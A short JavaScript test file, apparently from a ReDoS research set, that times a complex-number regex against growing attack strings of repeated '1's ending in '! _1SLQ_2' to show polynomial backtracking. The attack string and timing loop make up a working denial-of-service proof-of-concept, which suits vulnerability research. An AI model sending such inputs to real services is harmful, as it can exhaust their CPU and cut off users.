/* 8559
 * ^([-+]?(\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?[r]?|[-+]?((\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?)?[i]|[-+]?(\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?[r]?[-+]((\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?)?[i])$
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:""+"1"*5000+"! _1SLQ_2"
 */
var REGEX = /^([-+]?(\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?[r]?|[-+]?((\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?)?[i]|[-+]?(\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?[r]?[-+]((\d+\.?\d*|\d*\.?\d+)([Ee][-+]?[0-2]?\d{1,2})?)?[i])$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '1'.repeat(i*10000) + '! _1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}